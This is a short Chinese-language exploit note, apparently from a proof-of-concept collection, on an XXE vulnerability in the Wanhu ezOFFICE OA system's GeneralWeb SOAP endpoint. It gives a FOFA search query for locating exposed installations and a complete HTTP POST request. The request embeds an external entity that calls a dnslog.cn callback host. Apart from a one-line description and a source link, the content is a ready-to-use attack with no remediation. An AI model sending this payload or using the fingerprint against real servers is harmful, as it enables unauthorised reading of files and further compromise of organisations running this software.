# 万户OA系统接口GeneralWeb存在XXE漏洞

万户OA系统接口GeneralWeb存在XXE漏洞，允许攻击者利用XML解析器处理外部实体，从而访问本地文件或进行其他恶意操作，可能导致敏感信息泄露和系统被攻击。

## fofa

```javascript
app="万户ezOFFICE协同管理平台"
```

## poc

```javascript
POST /defaultroot/xfservices/./GeneralWeb HTTP/1.1
Host: 
User-Agent: Moziilla/5.0 (Linux; U; Android 2.3.6; en-us; Nexus S Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
Content-Type: text/xml;charset=UTF-8
SOAPAction: 
Content-Length: 457

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:gen="http://com.whir.service/GeneralWeb">
  <soapenv:Body>
    <gen:OAManager>
      <gen:input>
        &lt;?xml version="1.0" encoding="UTF-8"?&gt;
        &lt;!DOCTYPE root [
        &lt;!ENTITY x SYSTEM "http://123.6x9ryk.dnslog.cn"&gt;]&gt;
        &lt;root&gt;&amp;x;&lt;/root&gt;
      </gen:input>
    </gen:OAManager>
  </soapenv:Body>
</soapenv:Envelope>
```



## 漏洞来源

- https://forum.butian.net/share/3784